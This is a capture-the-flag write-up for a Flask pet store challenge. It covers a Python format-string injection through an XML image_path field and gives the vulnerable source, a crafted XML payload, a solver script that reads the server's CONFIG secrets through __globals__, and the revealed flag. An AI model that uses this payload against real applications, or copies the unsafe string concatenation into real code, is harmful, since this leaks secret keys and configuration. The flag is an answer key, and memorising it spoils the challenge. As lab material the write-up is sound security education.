# Pet Store Viewer

## Description
> Explore our online pet store for adorable companions – from playful kittens to charming chickens. Find your perfect pet today. Buy now and bring home a new friend!

![image](https://github.com/user-attachments/assets/fdf1d4a7-cef9-4ebf-a4cb-72d8586cb931)
![image](https://github.com/user-attachments/assets/a47ff9a2-8843-434a-a36b-19214fffffba)

<details>
<summary>Source of <code>app.py</code></summary>

```py
from flask import Flask, render_template, url_for ,request
import os
import defusedxml.ElementTree as ET

app = Flask(__name__)

CONFIG = {
    "SECRET_KEY" : os.urandom(24),
    "FLAG" : open("/flag.txt").read()
}

app.secret_key = CONFIG["SECRET_KEY"]

class PetDetails: 
    def __init__(self, name, price, description, image_path, gender, size): 
        self.name = name 
        self.price = price 
        self.description = description 
        self.image_path = image_path 
        self.gender = gender 
        self.size = size 

def parse_store_xml_file(xml_file="store.xml"):
    try:
        tree = ET.parse(xml_file)
        root = tree.getroot()

        items = []
        for item_element in root.findall('item'):
            name = item_element.find('name').text
            price = float(item_element.find('price').text)
            description = item_element.find('description').text
            image_path = item_element.find('image_path').text
            gender = item_element.find('gender').text
            size = item_element.find('size').text

            item_data = (name, price, description, image_path, gender, size)
            items.append(item_data)

        return items
    except ET.ParseError as e:
        print(f"Error parsing XML: {e}")
    return None

def parse_xml(xml):
    try:
        tree = ET.fromstring(xml)
        name = tree.find("item")[0].text
        price = float(tree.find("item")[1].text)
        description = tree.find("item")[2].text
        image_path = tree.find("item")[3].text
        gender = tree.find("item")[4].text
        size = tree.find("item")[5].text
        details = PetDetails(name,price,description,image_path,gender,size)
        combined_items = ("{0.name};"+str(details.price)+";{0.description};"+details.image_path+";{0.gender};{0.size}").format(details)
        return [combined_items]
    except Exception as e:
        app.logger.error("Malformed xml, skipping")
        app.logger.error(e)
        return []

# Index
@app.route('/')
def index():
    return render_template('index.html',value=parse_store_xml_file())

@app.route('/view')
def view():
    xml = request.args.get('xml')
    list_results = parse_xml(xml)
    if list_results:
        items = list_results[0].split(";")
        return render_template('view.html',value=items)
    else:
        return render_template('error.html')

# Main Function
if __name__ == '__main__':
    app.run(debug=True, host="0.0.0.0")
```
</details>

## Challenge Overview

We were given a web application with two main endpoints:

1. **`/`**: Displays a list of pets.
2. **`/view`**: Shows the details of a specific pet.

The challenge hinted that the flag was stored within the server's configuration, specifically in the `CONFIG` dictionary, accessible through the Flask application.

### Initial Investigation

The application was built using Python Flask, and the source code for `app.py` was provided. Upon examining the code, I discovered that the flag was stored in the `CONFIG` dictionary under the `FLAG` key.

The `/view` endpoint accepts an XML input via a query parameter named `xml`. This XML is parsed by the `parse_xml` function, which extracts information such as the pet's name, price, description, image path, gender, and size.

```py
@app.route('/view')
def view():
    xml = request.args.get('xml')
    list_results = parse_xml(xml)
    if list_results:
        items = list_results[0].split(";")
        return render_template('view.html',value=items)
    else:
        return render_template('error.html')

```
### Identifying the Vulnerability

In the `parse_xml` function, the `image_path` is concatenated directly into the `combined_items` string without using a format string placeholder. This opens up the potential for a Format String Injection vulnerability.

```py
def parse_xml(xml):
    try:
        tree = ET.fromstring(xml)
        name = tree.find("item")[0].text
        price = float(tree.find("item")[1].text)
        description = tree.find("item")[2].text
        image_path = tree.find("item")[3].text
        gender = tree.find("item")[4].text
        size = tree.find("item")[5].text
        details = PetDetails(name,price,description,image_path,gender,size)
        combined_items = ("{0.name};"+str(details.price)+";{0.description};"+details.image_path+";{0.gender};{0.size}").format(details)
        return [combined_items]
    except Exception as e:
        app.logger.error("Malformed xml, skipping")
        app.logger.error(e)
        return []
```
By exploiting this vulnerability, it is possible to retrieve the contents of the `CONFIG` dictionary, including the flag.

## Solution

### Developing the Exploit

To exploit this, I crafted a malicious XML payload that injected the format string `{0.__init__.__globals__[CONFIG][FLAG]}` into the `image_path` field. This would allow us to extract the flag stored in the `CONFIG` dictionary.

### Crafting the XML Payload

```xml
<?xml version="1.0" encoding="utf-8"?>
<store>
    <item>
        <name>value0</name>
        <price>0.1</price>
        <description>value2</description>
        <image_path>{0.__init__.__globals__[CONFIG][FLAG]}</image_path>
        <gender>value4</gender>
        <size>value5</size>
    </item>
</store>
```
- `0.__init__` accesses the `__init__` method of the details object (which is a PetDetails instance).
- `.__globals__` accesses the global variables in the context where __init__ was defined, which includes the CONFIG dictionary.
- `[CONFIG]` retrieves the CONFIG dictionary from the global variables.
- `['FLAG']` retrieves the FLAG value from the CONFIG dictionary.

### Executing the Exploit

I implemented the following `solver.py` script to send the crafted XML payload to the challenge server:

```python
import requests

requests.packages.urllib3.disable_warnings()
s = requests.Session()
s.verify = False

XML = """\
<?xml version="1.0" encoding="utf-8"?>
<store>
    <item>
        <name>value0</name>
        <price>0.1</price>
        <description>value2</description>
        <image_path>{0.__init__.__globals__[CONFIG][FLAG]}</image_path>
        <gender>value4</gender>
        <size>value5</size>
    </item>
</store>
""".strip()

BASE_URL = "http://localhost:8222"

def main():
    res = s.get(
        f"{BASE_URL}/view",
        params={"xml": XML.replace("\n", "")},
    )

    print(res.text)

if __name__ == "__main__":
    main()
```

**Result:**

After running the `solver.py` script against the challenge server, the output revealed the flag, which was URL-encoded in the following format:

```html
<img src="/static/images/wgmy%7B74ba870f1a4873a3ba238e0bf6fa9027%7D" alt="Item Image">
```

By decoding the URL-encoded string, I retrieved the flag:

## Flag
```
wgmy{74ba870f1a4873a3ba238e0bf6fa9027}
```
